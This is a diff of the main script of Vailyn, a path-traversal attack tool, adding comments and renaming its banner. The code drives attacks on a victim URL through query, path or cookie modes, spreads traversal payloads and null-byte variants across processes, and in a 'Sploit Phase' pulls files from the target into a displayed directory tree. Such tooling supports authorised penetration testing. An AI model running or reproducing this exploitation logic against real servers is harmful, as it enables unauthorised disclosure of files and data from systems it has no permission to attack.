@@ -13,10 +13,9 @@ _____, ___
       ,   
        
 
-┌─[pathtrav]─[~]
+┌─[Vailyn]─[~]
 └──╼ VainlyStrain
 """
-
 
 import treelib, argparse
 import requests, sys
@@ -41,9 +40,11 @@ from core.colors import color
 from core.variables import payloadlist, nullchars, version, sdirs, commons, processes, cachedir
 
 
+#initialize file tree
 filetree = treelib.Tree()
 filetree.create_node(color.O+"/"+color.END+color.RD, "root")
 
+"""Vailyn's main - parse args, start attacks & print results"""
 def main() -> int:    
     banner()
     parser = build_parser()
@@ -53,6 +54,7 @@ def main() -> int:
         parser.print_usage()
         sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                 'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -v, -a and -l mandatory')
+
     #load dictionaries
     if opt['lists']:
         with open(args.lists[0]) as filelisted:
@@ -74,6 +76,7 @@ def main() -> int:
     checkdepth = 8
     cookiefile = ""
 
+    #handle optional arguments
     if opt["loot"]:
         loot = True
 
@@ -97,8 +100,10 @@ def main() -> int:
     cookie = None
     selected = ""
 
+    #create directory permutations from dictionary
     iter=1
     ndirs=list.copy(sdirs)
+    #remove empty string causing duplicates
     del ndirs[0]
     mdirs=[]
     while (iter<=(depth)):
@@ -107,25 +112,29 @@ def main() -> int:
     for elem in mdirs:
         diri=''.join(elem)
         sdirs.append(diri)
+
+    #equally split dictionary entries and payloads to all threads
     splitted = listsplit(sdirs, round(len(sdirs)/processes))
     paysplit = listsplit(payloadlist, round(len(payloadlist)/processes))
-    if (args.attack == 1):
+
+    if (args.attack == 1):  #query mode
         if not opt["param"]:
             parser.print_usage()
             sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                 'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -p mandatory for -a 1')
         print("{}Vailyn: {}PARAM{}".format(color.RC, color.END+color.RB, color.END))
         param = args.param
-    elif (args.attack == 2):
+    elif (args.attack == 2):  #path mode
         if not args.victim.endswith("/"):
             args.victim = args.victim + "/"
         print("{}Vailyn: {}PATH{}".format(color.RC, color.END+color.RB, color.END))
-    elif (args.attack == 3):
+    elif (args.attack == 3):  #cookie mode
         print("{}Vailyn: {}COOKIE{}".format(color.RC, color.END+color.RB, color.END))
 
     print("    v" + version)
     time.sleep(0.5)
 
+    #fetch and select cookie for cookie mode
     if args.attack == 3:
         print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Parsing Cookie\n'.format(color.RD, color.END))
         cookie, selected = readCookie(args.victim)
@@ -133,6 +142,8 @@ def main() -> int:
     print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Analysis Phase\n'.format(color.RD, color.END))
         
     vlnysis = True
+
+    #present option to skip phase 1 if cache from previous attack present
     targetcache = parseUrl(args.victim)
     if os.path.exists(cachedir+targetcache+"payloads.cache") and os.path.exists(cachedir+targetcache+"nullbytes.cache"):
         choice = input("{0}[!]{1} Detected Payload cache from previous attack.\n{0}[?]{1} Do you want to load the cache and skip Phase 1? (enter if not) :> ".format(color.RD, color.END))
@@ -145,19 +156,23 @@ def main() -> int:
     if vlnysis:
         print("{0}[+]{1} Loaded {2}{3}{1} payloads.\n".format(color.RD, color.END, color.BOLD, len(payloadlist)*len(nullchars)))
         starting_time = time.time()
+        #initiate phase 1 - vulnerability analysis
         with Pool(processes=processes) as pool:
             res = [pool.apply_async(phase1, args=(args.attack,args.victim,victim2,param,cookie,selected,verbose,checkdepth,l,vlnfile,cookiefile,)) for l in paysplit]
             for i in res:
+                #fetch results
                 tuples = i.get()
                 foundpayloads += tuples[0]
                 foundnullbytes += tuples[1]
             
         ending_time = time.time()
         vuln_time = ending_time - starting_time
+        #save working payloads to cache
         save(targetcache, foundpayloads, foundnullbytes)
     else:
         vuln_time = 0.0
-                
+
+    #determine if phase 2 happens          
     attack = False
     if foundpayloads:
         attack = True
@@ -170,15 +185,18 @@ def main() -> int:
         cont = input("[!] No payload succeeded. Attack anyways? (enter if not) :> ")
         if cont != "":
             attack = True
+            #attack with everything if phase 1 was unsuccessful
             selectedpayloads = payloadlist
             selectednullbytes = nullchars
-    #start the attack
+
+    #start the exploitation phase
     starting_time = time.time()
     if attack:
         print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Sploit Phase\n'.format(color.RD, color.END))
         with Pool(processes=processes) as pool:
             res = [pool.apply_async(phase2, args=(args.attack,args.victim,victim2,param,cookie,selected,commons,l,depth,verbose,loot,selectedpayloads,selectednullbytes,cookiefile,)) for l in splitted]
             for i in res:
+                #fetch results
                 restuple = i.get()
                 foundfiles += restuple[0]
                 foundurls += restuple[1]
@@ -187,12 +205,15 @@ def main() -> int:
     ending_time = time.time()
     attack_time = ending_time - starting_time
     total_time = vuln_time + attack_time
+
+    #display found files in a file tree
     print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Directory Tree\n'.format(color.RD, color.END))
     if foundfiles:
         create_tree(filetree, foundfiles)
         filetree.show()
     if not foundurls:
         print("nothing found")
+
     print("{}Scan completed in {}s.{}".format(color.RC, total_time, color.END))
 
 
